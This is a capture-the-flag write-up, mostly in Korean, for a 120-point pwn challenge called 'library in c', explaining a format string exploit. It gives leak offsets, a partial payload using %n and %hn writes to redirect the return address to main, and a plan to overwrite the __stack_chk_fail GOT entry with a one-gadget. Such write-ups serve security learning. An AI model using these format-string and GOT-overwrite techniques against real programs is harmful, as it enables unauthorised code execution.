lib in c write up
---------------
pwn , 120pts

desc 
---------------
```
After making that trainwreck of a criminal database site, clam decided to move on and make a library book manager ... but written in C ... and without any actual functionality. What a fun guy. I managed to get the source and a copy of libc from him as well.

Find it on the shell server at /problems/2020/library_in_c, or over tcp at nc shell.actf.co 20201.

```

- FSB
- got overwrite

files 
---------------

- challenge 
- source
- libc.so.6 (glic 2.23 -> ubuntu 16.04)

checksec 
---------------
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
solution 
---------------
fgets를 통해 64바이트만큼 두번의 입력을 받고 , 입력한 내용을 printf 두번으로 그대로 출력해 FSB가 유발된다. 
64바이트면 8번 입력이 가능한데, 어째 좀 적어보인다. 내가 원하는 대로 조작을 해보려면 여러번의 입력이 필요해보인다. 

일단 ret를 바꿔봐야 하므로, 
첫째 입력에서 스택주소를 leak 한 다음 ret 위치에 main 함수 시작부분 주소를 넣어주자. 
제일 처음 lx 로 스택주소가 나오는데, ret위치와 +0x2738만큼 균일하게 차이가 난다.
27번째에서 libc 주소가 나오고, 오프셋은 0x20830 이다.
따라서 해당값을 스택에 넣어준 다음 main의 시작주소를 덮어씌워주자. 

```

payload2 = st        
payload2 += "%21$n  "    #0x40

st = "%"+str(main[2])+"c"
st += " "*(8-len(st))

payload2 += st          #0x0747
payload2 += "%20$hn   "  

payload2 += p64(ret)         #20 -> 뒷부분
payload2 += p64(ret+2)       #21 -> 앞부분 

```

그 다음 got에 원샷가젯 주소를 덮어씌울건데 , 12바이트 주소를 덮어씌워야 하므로 3번의 입력이 필요하여
8*9 = 72 바이트 만큼 입력이 들어가야 한다 . 
두번째 반복때 카나리 체크 함수인 __stack_chk_fail 의  got를 덮어 씌우면서 
카나리가 있는 스택의 값을 건드려 해당 함수가 실행되게 만들것이다. 

풀이완료.



